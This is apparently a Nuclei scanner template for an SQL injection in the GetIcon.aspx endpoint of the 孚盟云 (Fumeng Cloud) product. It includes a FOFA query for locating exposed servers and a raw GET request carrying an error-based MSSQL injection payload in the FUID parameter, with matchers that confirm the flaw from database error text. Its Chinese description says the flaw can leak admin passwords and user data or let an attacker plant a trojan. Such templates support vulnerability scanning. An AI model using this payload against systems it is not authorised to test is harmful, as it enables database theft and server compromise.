id: fumengyun-GetIcon_aspx-sql

info:
  name: 孚盟云 GetIcon.aspx SQL注入漏洞
  author: Dscan
  severity: high
  description: |-
    fofa: app="孚盟软件-孚盟云"
    孚盟云 GetIcon.aspx 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - Dscan
  tags: sql injection

http:
  - raw:
      - |
        GET /Common/GetIcon.aspx?FUID=-1%27and+1=@@VERSION-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Microsoft SQL'
          - '转换成数据类型 int 时失败'
        condition: and
      - type: status
        status: 
          - 500
